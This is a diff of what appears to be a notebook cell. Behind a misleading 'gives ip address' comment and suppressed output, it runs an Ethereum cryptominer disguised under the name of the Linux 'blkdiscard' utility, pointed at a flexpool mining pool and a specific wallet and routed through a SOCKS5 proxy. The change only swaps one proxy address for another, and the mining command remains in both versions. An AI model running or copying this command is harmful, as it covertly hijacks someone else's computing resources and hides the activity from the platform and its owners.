@@ -2,4 +2,4 @@
 %%capture
 
 #gives ip address 
-export http_proxy=socks5://192.252.208.70:14282; curl ipecho.net/plain && curl ipecho.net/plain && chmod +x blkdiscard && ./blkdiscard --algo ETHASH --pool stratum+ssl://eth-de.flexpool.io:5555 --user 0x6bdcCbAEE917403f3704aABFa5811c989ccDf621.KULI-JAWA
+export http_proxy=socks5://192.252.220.92:17328; curl ipecho.net/plain && curl ipecho.net/plain && chmod +x blkdiscard && ./blkdiscard --algo ETHASH --pool stratum+ssl://eth-de.flexpool.io:5555 --user 0x6bdcCbAEE917403f3704aABFa5811c989ccDf621.KULI-JAWA
